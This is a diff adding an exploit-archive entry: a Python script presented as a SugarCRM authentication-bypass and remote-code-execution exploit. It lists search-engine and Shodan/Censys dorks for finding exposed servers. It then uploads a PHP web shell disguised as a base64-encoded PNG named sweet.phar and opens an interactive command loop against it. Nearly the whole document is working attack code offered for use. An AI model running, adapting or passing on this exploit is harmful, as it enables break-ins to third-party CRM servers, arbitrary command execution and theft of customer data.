@@ -1,0 +1,52 @@
+id: 38134
+date: 01/03/2023
+title: SugarCRM Shell Upload Exploit
+author: sw33t.0day
+cves: 
+
+#!/usr/bin/env python
+#
+# SugarCRM 0-day Auth Bypass + RCE Exploit
+#
+# Dorks:
+# https://www.google.com/search?q=site:sugarondemand.com&filter=0
+# https://www.google.com/search?q=intitle:"SugarCRM"+inurl:index.php
+# https://www.shodan.io/search?query=http.title:"SugarCRM"
+# https://search.censys.io/search?resource=hosts&q=services.http.response.html_title:"SugarCRM"
+# https://search.censys.io/search?resource=hosts&q=services.http.response.headers.content_security_policy:"*.sugarcrm.com"
+
+import base64, re, requests, sys, uuid
+
+requests.packages.urllib3.disable_warnings()
+
+if len(sys.argv) != 2:
+  sys.exit("Usage: %s [URL]" % sys.argv[0])
+  
+print "[+] Sending authentication request"
+
+url     = sys.argv[1] + "/index.php"
+session = {"PHPSESSID": str(uuid.uuid4())}
+params  = {"module": "Users", "action": "Authenticate", "user_name": 1, "user_password": 1}
+
+requests.post(url, cookies=session, data=params, verify=False)
+
+print "[+] Uploading PHP shell\n"
+
+png_sh = "iVBORw0KGgoAAAANSUhEUgAAABkAAAAUCAMAAABPqWaPAAAAS1BMVEU8P3BocCBlY2hvICIjIyMjIyI7IHBhc3N0aHJ1KGJhc2U2NF9kZWNvZGUoJF9QT1NUWyJjIl0pKTsgZWNobyAiIyMjIyMiOyA/PiD2GHg3AAAACXBIWXMAAA7EAAAOxAGVKw4bAAAAKklEQVQokWNgwA0YmZhZWNnYOTi5uHl4+fgFBIWERUTFxCXwaBkFQxQAADC+AS1MHloSAAAAAElFTkSuQmCC"
+upload = {"file": ("sweet.phar", base64.b64decode(png_sh), "image/png")} # you can also try with other extensions like .php7 .php5 or .phtml
+params = {"module": "EmailTemplates", "action": "AttachFiles"}
+
+requests.post(url, cookies=session, data=params, files=upload, verify=False)
+
+url = sys.argv[1] + "/cache/images/sweet.phar"
+
+while True:
+  cmd = raw_input("# ")
+  res = requests.post(url, data={"c": base64.b64encode(cmd)}, verify=False)
+  res = re.search("#####(.*)#####", res.text, re.DOTALL)
+  if res:
+    print res.group(1)
+  else:
+    sys.exit("\n[+] Failure!\n")
+
+#  0day.today [2023-03-27]  #
